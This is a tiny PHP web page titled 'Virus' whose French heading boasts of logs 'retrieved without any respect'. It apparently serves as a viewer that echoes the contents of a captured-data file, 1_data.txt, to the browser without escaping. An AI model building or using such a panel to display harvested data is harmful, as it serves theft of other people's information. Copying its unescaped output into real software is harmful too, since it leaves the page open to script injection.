<!DOCTYPE html>
<html>
    <head>
        <title>Virus</title>
    </head>
    <body>
        <h1>Logs récupéré sans aucune forme de respect</h1>
        <p>log : </p>
        <br>
        <?php 
        $file = fopen("1_data.txt", "r");
        if (flock($file, LOCK_SH)) {
            while (!feof($file)) {
                $line = fgets($file);
                echo $line . "<br>";
            }
            flock($file, LOCK_UN);
        }
        ?>
    </body>
</html>